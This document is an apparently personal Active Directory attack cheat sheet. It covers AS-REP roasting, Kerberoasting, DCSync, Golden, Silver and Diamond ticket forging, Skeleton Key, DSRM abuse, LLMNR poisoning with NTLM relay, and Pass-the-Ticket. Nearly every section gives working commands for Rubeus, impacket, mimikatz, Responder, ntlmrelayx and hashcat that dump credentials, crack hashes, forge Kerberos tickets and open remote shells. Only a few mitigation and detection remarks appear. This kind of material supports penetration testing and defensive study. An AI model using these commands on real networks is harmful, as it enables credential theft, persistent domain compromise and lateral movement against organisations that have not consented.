---
title: Active Directory (AD) Attacks
---

# AD Attack Cheatsheet

**Description: This is going to be a compilation of my notes on various *Active Directory (AD)* attacks. I may dive deeper into some attacks and go over creating a homelab vulnerable to these attacks and dive into tools to execute these attacks as well**

* [ASREPRoastable Accounts](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast) - Active Directory user accounts that have the **DO NOT REQUIRE KERBEROS PREAUTHENTICATION** property enabled. This allows an attacker to request a Kerberos ticket without having to provide a password for **preauthentication**, just the *username* and the *domain* which can be easily found. The attacker can then use this ticket to access resources that the vulnerable account has authorization to access on the network.
	* An attacker could steal password hashes for *ASREProastable accounts* as well which can be done using a tool known as `Rubeus` from a Windows host. The attacker would use `Rubeus` to request a Kerberos ticket for the vulnerable account, then extract the password hash from the ticket. Once the hash is obtained, the attacker can then crack it via brute-force or a dictionary attack
		* `rubeus.exe asreproast` would find all accounts that don't require **Kerberos PreAuthentication** & extract their TGTs for offline cracking
			* You can also specify the format that you want the TGT to be outputted in: `rubeus.exe asreproast /format:hashcat /outfile:C:\Temp\hashes.txt`
			* Then if you wanted to begin cracking it with `hashcat`, you'd run: `hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt`
	* An attacker could also use `GetNPUsers.py` from the `impacket` library to also steal password hashes from a Linux attack host
		* `impacket-GetNPUsers domain.local\vulnerable-user -dc-ip <insert DC IP addr here> -outputfile asrephashes.txt -no-pass` where `vulnerable-user` is the user who doesn't require Kerberos preauthentication
		* You can also specify a username list instead of a single username: `impacket-GetNPUsers domain.local\ -usersfile usernames.txt -dc-ip <insert DC IP addr here> -outputfile asrephashes.txt -no-pass`
	* **Mitigation**: Disable the **DO NOT REQUIRE KERBEROS PREAUTHENTICATION** property on all user accounts. If not possible, implement MFA for user accounts & monitor AD logs for such requests.
* [Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast) - *lateral movement/privilege escalation technique* that targets accounts configured with *Service Principal Names (SPNs)* & requests a *Ticket Granting Service (TGS)* for any service account in the same domain
	* SPNs are unique IDs used by Kerberos to map service instances to service accounts in whose context the service is running
	* Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts sucha s *NT AUTHORITY\\Local Service*
	* An attacker only needs a valid domain account credentials (cleartext password or NTLM hash)
		* The permissions that the domain account has doesn't matter
	* We can use `bloodhound` queries to find all Kerberostable accounts within a domain 
	* We can use `impacket-GetUserSPNs` from the `impacket` library to perform kerberoasting
		* `impacket-GetUserSPNs -request -dc-ip <DC IP Addr> <FQDN>/<username> -outputfile hashes.kerberoast` 
			* This will prompt you for the domain password for the domain username that you specify
			* You can also specify the format that you want to output the hash in with the `-format` option with the two being either `john` or `hashcat`
		* After you get the TGS, you can crack the TGS to obtain the hash of the Kerberoasted user using either `john` or `hashcat`
			* `john hashes.kerberoast --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt`
			* `hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt`
	* You can also use `rubeus` to perform kerberoasting & you can have it either kerberoast a specific user or kerberoast any kerberoastable user that it can find:
		* `rubeus.exe kerberoast /output:hashes.kerberoast` to find a kerberoastable user & perform the attack on them
		* `rubeus.exe kerberoast /user:vulnerable-user /output:hashes.kerberoast` to kerberoast a user named `vulnerable-user`
* [Domain Controller Sync (DCSync)](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync) - allows us to use a domain user account, either a *domain administrator* account or a domain account with sufficient *replication* privileges, to dump user credentials for an entire *domain*, and potentially, the entire *domain forest*
	* Targets *domain replication* which is a measure implemented by AD to ensure all DCs within a forest have sync'd/the same data. 
	* Allows us to access the contents of the `NTDS.DIT` file
	* Requirements: *Domain administrator* account or a domain account w/enough privileges
	* [Example usage here](https://www.aldeid.com/wiki/Impacket/secretsdump)
		* `impacket-secretsdump -dc-ip <insert DC IP addr here> domain\user:password@<insert DC IP addr here>`
			* You may need to surround the password with single quotes (`'`)
	* We can then either take these dumped password hashes to perform *Pass-The-Hash* attacks, or use them in order to create *Golden Tickets* since we would now have the *krbtgt* account hash!
	* With this attack, we can obtain a *kerberos key*, which we can use to create a **Golden Ticket**
* [Golden Ticket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket) - A *persistence* mechanism for AD that would allow an attacker to forge & sign a *Ticket Granting Ticket (TGT)* using the NTLM hash of the built-in `krbtgt` account. **Golden Tickets** are forged offline, and a reason why they work is because DCs don't track TGTs they've issued, so they just accept any TGTs that are encrypted with its own `krbtgt`'s NTLM hash!
	* Since an attacker is able to forge a TGT, they're able to access any service (or machine) on the domain
		* If it were a *Ticket Granting Service (TGS)*, such as with a [Silver Ticket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket) attack, then an attacker would only be able to access a limited amount of services
	* An attacker needs the `krbtgt` NTLM hash which usually means the domain must first be compromised in order to obtain this hash
		* You also need the `domain SID` which you can obtain from a Linux attack host by using [lookupsid.py](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py) from `impacket` (this requires valid domain credentials):
			* `lookupsid.py domain\user:'password'@<Insert DC IP addr here>`
	* To invalidate a Golden Ticket, you must:
		* Reset the `krbtgt`'s password twice. The first password reset has to be replicated across the entire domain which can take up to 24 hours. So after this has replicated across the entire domain, then you can reset the password the 2nd time
			* If an attacker gains access to the new NTLM password hash before the 2nd reset, they can simply create a new Golden Ticket & you have to start the invalidation process over again
	* You can obtain the `krbtgt` NTLM hash in various ways:
		* Dumping the `NTDS.dit` database
		* Through a `DCSync` attack
		* Both the aforementioned methods could be performed with `mimikatz`!
	* [ticketer.py](https://github.com/fortra/impacket/blob/master/examples/ticketer.py) from the `impacket` library can be used to create Golden Tickets from a Linux attack host:
		* `python ticketer.py -nthash <insert krbtgt NTLM hash here> -domain-sid <insert domain SID here> -domain <insert domain here> <insert username to create golden ticket for here>`
			* Creating the Golden Ticket for `administrator` is common
		* After the Golden Ticket has been created, you can perform a `Pass-the-Ticket (PTT)` using various tools from the `impacket` suite (EX: [psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py))
	* [mimikatz](https://github.com/gentilkiwi/mimikatz) can used to create Golden Tickets from a Windows attack host:
		* `kerberos::golden /User:Administrator /domain:<insert domain here> /sid:<insert domain SID here> /krbtgt: <insert krbtgt NTLM hash here> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt`
		* Then you can perform a `Pass-the-Ticket (PTT)` attack using a tool like [Rubeus](https://github.com/GhostPack/Rubeus):
			* `.\Rubeus.exe ptt /ticket:ticket.kirbi`
* [Silver Ticket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket) - A *persistence* mechanism allowing an attacker to create a *Ticket Granting Service (TGS)* Kerberos ticket for a service once they obtain an NTLM hash of a *service account*
	* Requires the **NTLM hash of a service account**
		* Also requires **domain SID** & **SPN**
			* You also need the `domain SID` which you can obtain from a Linux attack host by using [lookupsid.py](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py) from `impacket` (this requires valid domain credentials):
				* `lookupsid.py domain\user:'password'@<Insert DC IP addr here>`
			* One example **SPN** you can use is the `CIFS` service which would give you access to the file system of a victim
				* Other potential target services can be found [here](https://adsecurity.org/?page_id=183)
	* Would allow an attacker to forge a ticket that can be used to access that service account's service
	* By default, the lifetime of these tickets is 30 days since that's how frequently computer accounts reset their passwords by default
	* To create/forge a Silver Ticket from a Linux attack host, [ticketer.py](https://github.com/fortra/impacket/blob/master/examples/ticketer.py) can be used:
		* `python ticketer.py -nthash <insert service account's NTLM here here> -domain-sid <insert domain SID here> -domain <insert domain name here> -spn <insert SPN here> <insert username to forge ticket for here>`
	* To create/forge a Silver Ticket from a Windows attack host, [mimikatz](https://github.com/gentilkiwi/mimikatz) can be used:
		* `kerberos::golden /domain:<insert domain here> /sid:<insert domain SID here> /rc4:<insert NTLM hash of service account here> /user:<insert user to forge/create ticket for> /service:<insert service SPN here> /target:<target domain FQDN>`
			* You can also use a `aes256` or `aes128` key by replacing `/rc4` with your `aes256` or `aes128` key
		* Then we can inject the Silver Ticket in memory using either `mimikatz` or [Rubeus](https://github.com/GhostPack/Rubeus):
			* `mimikatz.exe "kerberos::ptt ticket.kirbi"`
			* `.\Rubeus.exe ptt /ticket:ticket.kirbi`
		* Now we can obtain a remote shell using [PsExec](https://github.com/EliteLoser/Invoke-PsExec):
			* `.\PsExec.exe  -accepteula \\<insert FQDN name here> cmd`
* [Skeleton Key](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/skeleton-key) - A *persistence* mechanism allowing an attacker to patch the DC's `lsass.exe` process so they can authenticate as any user with the same password (`mimikatz` by default). This attack must be ran on the DC.
	* In addition to us being able to authenticate as any user with the same password, we'd also be able to authenticate normally with the legitimate username & password combinations so this wouldn't raise any suspicions
	* As long as the `lsass.exe` process isn't killed or restarted, we can authenticate with the patched credentials
	* An attacker could accomplish this using `mimikatz`:
		* The `misc::skeleton` module can help us do this (Default *Skeleton Key* is going to be `mimikatz`)
		* `privilege::debug` then `misc::skeleton`, then you should be able to authenticate as any user on the domain using the password `mimikatz`
* [Directory Services Restore Mode (DSRM) AD Account](https://adsecurity.org/?p=1785) - DSRM is a *safe mode* of sorts for any DC. It's essentially the *local admin* account on a DC. The password for this account is first set when a server is promoted to a DC & is rarely changed, so it makes it an attractive target for persistence since it's often overlooked
	* Name of the DSRM account is **Administrator** & is the DC's local admin account
	* We can utilize the DSRM AD account as a means of **persistence** since the password to this account is rarely changed since it's usually set & forgot about when the server is first promoted to be a DC
	* We can dump the NTLM hash by using `mimikatz`:
		* `token::elevate`
		* `lsadump::sam`
	* After the hash is obtained, we can use it through various ways when we want to access & login to the DSRM account:
		* Restarting the server in *Directory Services Restore Mode*:
			* `bcdedit /set safeboot /dsrepair`
		* Accessing DSRM without rebooting (only works on *Windows Server 2008 & newer*):
			* Set registry key `DsrmAdminLogonBehavior` to 1
			* Stop AD service
			* Login using DSRM credentials on the console
		* Accessing DSRM without rebooting (only works on *Windows Server 2008 & newer*):
			* Set registry key `DsrmAdminLogonBehavior` to 2
			* Login using DSRM credentials on the console
		* Remote Desktop Client when connecting to the *Console* which is `mstsc /console` prior to *Windows Server 2008*, but is `mstsc /admin` with *Windows Server 2008* & newer
			* *Windows Server 2012R2* refuses DSRM logon through RDP console
	* Since the DSRM account is a local admin account, it can be authenticated to over the network to the DC
		* To do this though, ensure that the registry key `DsrmAdminLogonBehavior` is set to `2`
		* We also don't need to know the password to the DSRM account, we just need the NTLM hash (*Pass-the-Hash (PTH)*)
			* So we can essentially use the DSRM NLTM Hash to perform a PTH attack to the DC in order to access the DC!
			* We can do this with `Mimikatz`:
				* `privilege::debug`
				* `sekurlsa::pth /domain:<insert domain name here> /user:Administrator /ntlm:<insert local admin/DSRM ntlm hash here>`
				* Why stop here though? Now that we've performed a PTH to gain access to the DC's file system under the local administrator/DSRM user, we can use our newfound access to perform a `DCSync` attack as well! We can do so using our trusty `mimikatz`:
					* `lsadump::dcsync /domain:<insert domain here> /dc:<insert DC shortname here> /user:krbtgt`
					* We use the `krbtgt` account since this user has DC replication privileges
					* This is good because we can essentially dump all domain credentials using the `DCSync` attack, despite the fact that the DSRM account we abuse our access to is only a local admin account
* [LLMNR Poisoning](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks) - An **initial access technique** that an attacker could use where they listen for LLMNR resolutions/queries for resources (EX: File share name resolutions) from victims on a network & answer them with their own IP address & asks the victim to authenticate with their NTLM hash before giving access to the requested resource
	* This attack type is common when a victim on a network mistypes a fileshare path (EX: `\\fileshre` instead of `\\fileshare`) or a URL (I believe in the case of a URL, it'd be WPAD poisoning, though `responder` helps to answer all these query types)
	* You can read more about a deep dive into LLMNR poisoning [here](https://1d8.github.io/ad-adventures/llmnrpoisoning/)
	* You **must be on the same network as the victim** to perform LLMNR poisoning
	* **Link-Local Multicast Name Resolution (LLMNR)** & **NetBIOS Name Service (NBT-NS)** is used for local host resolution when DNS queries fail on the network
		* When DNS fails, LLMNR & NBT-NS queries are sent out to all hosts on the network for anyone to answer, this is where the attacker comes in & maliciously answers
		* Both these protocols are *unauthenticated* & broadcast messages for them are sent over *UDP* so attackers can exploit them to either direct victims to malicious services, or request that they authenticate before allowing them to access the service/resource they requested
	* We can use [Responder](https://github.com/lgandx/Responder) to take advantage of these DNS fallback protocols:
		* `Responder -I eth0 -wF -v` & wait for a user to mistype something!
		* When a user does mistype something, we'll get their NTLMv2 hash which we can choose to either `MultiRelay` (Comes bundled with `Responder`) (You can also use [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) from `impacket`) in order to relay the victim's authentication packets to other machines on the network, or to crack the victim's hash using a tool such as `hashcat` or `JohnTheRipper`
			* Cracking the hash (`hashcat`): `hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt`
			* Cracking the hash (`JohnTheRipper`): `john --wordlist=/usr/share/wordlists/rockyou.txt ntlmv2.txt`
			* Performing a relay attack with `ntlmrelayx.py`:
				* First we need to identify a list of targets that we can relay the captured hash to. These targets will have to have **SMB signing disabled**, we can use `crackmapexec` to find hosts that do:
					* `crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt`
				* Open up 1 terminal window & start up `responder`: `Responder -I eth0 -r -d -w`
				* Open up a 2nd terminal window & run `ntlmrelayx.py`: `ntlmrelayx.py -tf targets.txt`
					* The default behavior of `ntlmrelayx.py` is that if it successfully relays a hash, it'll dump the SAM database of the host that it relayed the hash to. we can also choose to execute a command though:
						* `ntlmrelayx.py -tf targets.txt -c whoami`
				* You can read more about this NTLM relay attack paired with `Responder` [here](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
* [Diamond Ticket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/diamond-ticket) - A **persistence mechanism** that utilizes a TGT which could be used to access any service as any user. It is created by modifying certain fields of a legitimate TGT. 
	* The main difference between a **Golden Ticket** and a **Diamond Ticket** is that a **Golden Ticket** is a forged completely offline while a **Diamond Ticket** is created by modifying a legitimate TGT which makes a **Diamond Ticket** attack more difficult to detect since it appears more as a legitimate ticket when compared to a **Golden Ticket**
		* A common method to detect **Golden Ticket** attacks is:
			* To look for `TGS-REQS` that have no corresponding `AS-REQ`
			* Look for TGTs that have silly values such as `mimikatz`'s default 10-year lifetime for the TGTs
		* But **Diamond Tickets** solve this problem since:
			* `TGS-REQS` will have a preceding `AS-REQ`
				* This basically means that **Diamond Tickets** follow the normal ticket request since we're requesting a legitimate Kerberos ticket & modifying it instead of forging our own offline. This means it'll blend into normal traffic.
			* The TGT will be issued by the DC since it's a legitimate TGT so it'll have the correct details from the domain's Kerberos policy. These values can be forged when forging a **Golden Ticket**, but it's a complicated process that may result in a mistake though
	* So how do we create a **Diamond Ticket**?
		* We must first request a TGT, then decrypt it using the domain's `krbtgt`'s NTLM hash, modifying the desired fields of the ticket, then re-encrypting it
		* We still impersonate some user on the domain (just like we do with the **Golden Ticket** attack) when creating a **Diamond Ticket** which means we have to grab a *user's RID* which we can use `powershell` to do:
			* `powershell Get-DomainUser -Identity <username> -Properties objectsid`
				* In order to run `Get-DomainUser`, you must first load the [Powerview Powershell Module](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1) (`. .\powerview.ps1`)
		* Then we can use [Rubeus](https://github.com/GhostPack/Rubeus) to actually create the **Diamond Ticket** with the *user's RID* in hand:
			* `.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512`
				* `/tgtdeleg` uses Kerberos GSS-API to obtain a useable TGT for a user w/o needing to know their password, NTLM/AES hash, or elevation on the host
				* `/ticketuser` is the username of the user we want to impersonate
				* `/ticketuserid` is the domain RID of the user we're impersonating
				* `/groups` are the desired group RIDs (`512` being Domain Admins groups)
				* `/krbkey` -  is the `krbtgt` AES256 hash
					* We don't need to provide this if we're using `/tgtdeleg`
* [Pass the Hash](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/over-pass-the-hash-pass-the-key) - 
* [Pass The Ticket](https://fastiraz.gitbook.io/doc/documentations/hack/hacktricks/windows-hardening/active-directory-methodology/pass-the-ticket) - In this attack, we steal *tickets* and pass them around to authenticate. It's very similar to the `Pass the Hash` attack in which we steal hashes & authenticate using them!
	* We can use a tool like `mimikatz` in order to dump Kerberos tickets from memory:
		* `privilege::debug`
		* `sekurlsa::tickets /export`
		* `mimikatz` will output the dumped tickets to the screen & save them as files onto disk
	* After we've exported the ticket, we can then use it, again using `mimikatz` to do so. We use it by injecting the TGT into our session which causes our session to use the identity & privileges of the user that corresponded to the TGT:
		* `kerberos::ptt C:\Path\To\Ticket\File.kirbi`
		* *NOTE: We aren't limited to only using `mimikatz` to inject the ticket into our session, there are also other tools we can use. UPDATE THIS TO INCLUDE OTHER TOOLS*
		* `kerberos::list` will list all the Kerberos tickets in memory currently for the current user. We can use it to confirm that we injected the correct TGT into our session by verifying the username matches that of the stolen ticket from earlier
	* Now that we have a session using our stolen TGT, we can perform recon to determine what access this ticket gets us:
		* Can do so by querying group membership (EX: `net user <username> /domain`)
		* If for example, we can now access resources such as remoting into other machines (EX: If our user is apart of a Workstations Admin group), we can then use `psexec` on a Windows host to remotely access other machines on the network that our TGT has given us access to 

## Useful Links
* Interactive cheat sheet for tools: https://wadcoms.github.io/
	* Can also input what you have & it'll tell you what you can do with it
* Notes about various red teaming techniques (includes AD stuff): https://www.ired.team/

# References
* https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/
* https://juggernaut-sec.com/domain-persistence-golden-ticket-and-silver-ticket-attacks/#Forging_a_Golden_Ticket_Using_ticketerpy
* https://adsecurity.org/?p=1785
* https://www.cynet.com/attack-techniques-hands-on/llmnr-nbt-ns-poisoning-and-credential-access-using-responder/
* https://zone13.io/post/cracking-ntlmv2-responses-captured-using-responder/
* https://blog.geoda-security.com/2018/05/gaining-foothold-using-responder-to.html
* https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html
* https://www.trustedsec.com/blog/a-diamond-in-the-ruff
* https://www.netwrix.com/pass_the_ticket.html
